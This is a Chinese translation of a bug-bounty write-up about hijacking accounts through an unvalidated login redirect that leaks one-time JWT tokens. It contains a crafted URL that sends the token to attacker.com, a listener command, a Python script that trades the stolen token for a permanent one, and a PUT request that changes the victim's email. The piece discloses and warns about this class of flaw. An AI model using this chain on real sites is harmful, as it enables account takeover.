通过未经验证的重定向来截获JWT令牌劫持帐户                 

​                                      [                          惊鸿一瞥最是珍贵](https://xz.aliyun.com/u/12987)  /                       2019-02-13 08:09:00 /                      浏览数 1479                                                                                                                      

------



[![img](assets/20190207115316-e68dfc66-2a8b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190207115316-e68dfc66-2a8b-1.png)

# 前言

有好长时间没有动笔写过文章了，忙碌了一阵时间后，决定再提笔写点最近的感受。今天，我将分享一篇有趣的文章，介绍我在Bug赏金计划中发现的一个漏洞。核心问题是未经验证的重定向，但我要在上面进行升华，不仅仅局限于重定向，所以话不多说，撸起袖子加油干！

# 知己知彼，百战不殆

## 了解应用程序

当以公司或应用程序为目标时，首先要确定应用程序流程以及它的工作机制。在不了解应用程序的情况下进行一系列的漏洞测试是徒劳的，因此我要测试未经验证验证的区域。我将应用程序分为两个部分，第一个部分是不需要身份验证的区域，第二部分是需要身份验证的区域。通过这种分类，我们可以轻松地在不同的区域中执行适当的测试。所以，另一件重要的事情便是深入研究登录机制。

## 了解登录过程

在执行渗透测试时，了解登录过程非常重要。如果我们能够理解登录流程，那么我们就很容易破解账户。测试登录时，查看应用程序在正常情况下的响应，在某些情况下，应用程序只是获取凭证并返回cookie（称之为基于cookie的认证）；在某些情况下，应用程序将返回一个有效的令牌，如用于对区域进行身份验证的JWT。如果用户通过Cookie进行身份验证，我们的主要目标应该是针对Cookie并设法窃取Cookie，但是在我的示例中，输入有效密码后返回一个JWT令牌，该令牌用于与API交互。因此，在我的例子中，身份验证流程是“基于令牌的”，形象地讲，如果我有一个受害者的令牌，那么应用程序将会把我视作受害者。

# 一次性的JWT令牌

有效登陆后，应用程序在GET请求参数中加入`token & email`进行302重定向到`/dashboard`。令牌参数保存仅可用于一次的JWT令牌。此令牌将用于与位于/ aapi / v1 / authentications / token的API端点令牌通信，接收永久的JWT令牌。

```
HTTP/1.1 302 Found
Date: Tue, 18 Dec 2018 19:51:21 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Location: http://secure.site.com/dashboard?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJhdXRoX29ubHkiOnRydWUsImV4cCI6MTU0NTE2MjY5Nn0.hzBq7uN2KiE8JNw1Uj_apd1OxqzS3JRKt-neoSP1vI&signup_event=true&email_event=demo@site.com
Cache-Control: no-cache
Set-Cookie: ...
```

# 可重用的JWT令牌

收到第一个令牌后，应用程序使用Authorization标头中的第一个JWT令牌向/aapi/v1/authentications/token发送GET请求：

```
GET /aapi/v1/authentications/token HTTP/1.1
Host: secure.site.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJhdXRoX29ubHkiOnRydWUsImV4cCI6MTU0NTE2MjY5Nn0.hzBq7uN2KiE8JNw1Uj_apd1OxqzS3JRsKt-neoSP1vI
content-type: application/json
origin: https://secure.site.com
Connection: close
```

此请求将返回一个永久的JWT令牌，该令牌将在整个API中使用。

```
{
"jwt_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJndWVzdF90b2tlbiI6bnVsbCwiZXhwIjoxNTQ1MTYyNjkzfQ.XPq-YkU01KYxffnHIRs5LoY5czIPn8WxqnbXbJOANDY",
"user": {
"id": 1,
"first_name": "Demo",
"last_name": "User",
"email": "demo@site.com",
"created_at": "2016-01-27T16:17:32.832Z"
}
```

现在，这是接收到的第二个JWT令牌，并在所有API端点中使用。之前通过重定向接收的一个JWT令牌不能多次使用，我们的主要关注点将是窃取`/token`响应中接收到的第二个令牌。

# 所有域上的未验证重定向

在我的测试中，我探索了应用程序的不同子域，发现了一个有论坛的子域，为了使用论坛，应用程序需要一个经过身份验证的用户，所以为了对用户进行身份验证，应用程序将返回到`secure.site.com`，这是我测试身份验证机制的域。这说明了位于`secure.site.com`中的单个身份验证机制涵盖了子域和其他区域的所有身份验证。所以我一旦登陆成功，应用程序将跳转到`forum.site.com`，并且是已认证状态。
 这很有趣，我发现了应用程序还进行了一些重定向，我确定了应用程序是如何知道我在论坛子域上的，有时基于应用程序重定向的Referrer标头。我发现当网页跳转到`secure.site.com`时一个名为`my_results_redirect`新的GET参数也随之发送。因此，在重定向到论坛之前，我最初的位置是`/login?my_results_redirect=https://forum.site.com/.`
 现在，在使用值为`https://forum.site.com`的`my_results_redirect`执行登录后，我发现应用程序有以下响应：

```
HTTP/1.1 302 Found
Date: Tue, 18 Dec 2018 19:51:21 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Location: https://forum.site.com/dashboard?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJhdXRoX29ubHkiOnRydWUsImV4cCI6MTU0NTE2MjY5Nn0.hzBq7uN2KiE8JNw1Uj_apd1OxqzS3JRsKt-neoSP1vI&signup_event=true&email_event=demo@site.com
Cache-Control: no-cache
Set-Cookie:
```

我发现我能够通过操纵`my_results_redirect`参数的值来篡改令牌的重定向区域。因此，如果它的值被设置为`https://shawarkhan.com`，那么应用程序将把用户重定向到`https://shawarkhan.com`。`my_results_redirect`参数在所有子域上进行了处理，因此所有域都有未经验证的重定向，但由于我们的目标是`secure.site.com`，所以我将重点放在它上。

# 截获一次性使用的JWT

因此，如果经过身份验证的用户访问精心编制的URL，我将在主机上收到JWT。输入命令python -m SimpleHTTPServer 80，当受害者访问`https://secure.site.com/login?my_results_redirect=http%3A%2F%2fattacker.com%2Fdashboard` ，我收到了第一个JWT令牌！

[![img](assets/20190207122738-b32b5300-2a90-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190207122738-b32b5300-2a90-1.png)
 现在是向`/ aapi / v1 / authentications / token`发出请求以接收最终JWT令牌的时候了。我发出了请求，结果发现请求被拒绝了。我很困惑，因为我步骤完全正确。我执行了每个步骤，发现很徒劳，并且无法获得第二个JWT令牌。啊哈！保护机制？

# 约0.01％的保护？

我发现开发人员实施了一些小小的保护措施，以防止未经授权使用第一个令牌。即使我遵循了应用程序正在执行的相同步骤，我的请求被拒绝的原因就是延迟。应用程序在令牌生成后直接将其发送给API，所以在生成令牌和发送令牌给API之间有一个小延迟。下面是一些小问题：
 令牌只有一次可用。
 令牌在几秒钟内过期。
 为了消除过期问题，我使用下面的python代码自动化了几个步骤：

```
# A sample code that obtains a permanent JWT token when provided a temporary JWT token
import json
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

jwt_token=raw_input("Enter token > ")
exploit_url = "https://secure.site.com:443/aapi/v1/authentications/token"
exploit_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.site.com", "authorization": "Bearer "+str(jwt_token), "content-type": "application/json", "origin": "https://www.site.com", "Connection": "clos"}
retrieve_token = requests.get(exploit_url, headers=exploit_headers,verify=False)

if retrieve_token.status_code==200:
    s=json.loads(retrieve_token.text)
    print '[+] Token valid!'
    print '[i] Retrieving information:'
    print '\n[*] Permanent JWT Token: %s\n[*] First name: %s\n[*] Last name: %s\n[*] User ID: %s\n[*] Email Addr: %s'%(s['jwt_token'],s['user']['first_name'],s['user']['last_name'],s['user']['id'],s['user']['email'])

else:
    print 'One-time token expired, try to retrieve token again.'
```

代码与`/token API`端点通信，并从响应中检索JWT令牌，该令牌用于与API端点通信。整个应用程序都使用API来更改帐户信息和其他功能。

[![img](assets/20190207123304-75979dcc-2a91-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190207123304-75979dcc-2a91-1.png)

# Time to play

现在，使用永久的JWT令牌可以与API进行通信，就像我现在已经有了受害者的JWT令牌。API端点`/aapi/v1/users/1`接受PUT请求。那我就能偷梁换柱，将受害者的邮箱地址改为攻击者的邮箱地址，之后更改密码实现完整的用户劫持。通过使用受害者的JWT令牌发送以下请求，我能够将受害者的电子邮件更改为`attacker@shawarkhan.com`：

```
PUT /aapi/v1/users/1 HTTP/1.1
Host: secure.site.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rw:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
authorization: Bearer Victims_JWT_here
content-type: application/json
origin: https://site.com
Content-Length: 200
Connection: close

{"id":id,"user":{"consumer_attributes":{"dob":"1986-01-26","gender":"female","wants_marketing":true},"first_name":"Demo","last_name":"User","phone_number":"512-000-0000","email":"attacker@shawarkhan.com"}}
```

以上，就是我如何完全劫持受害者账户，重定向漏洞的风险很大。但大多数人都不以为意，希望这篇文章能够给人更多的警醒。

```
翻译文章：https://www.shawarkhan.com/2019/01/hijacking-accounts-by-retrieving-jwt.html
```



​                 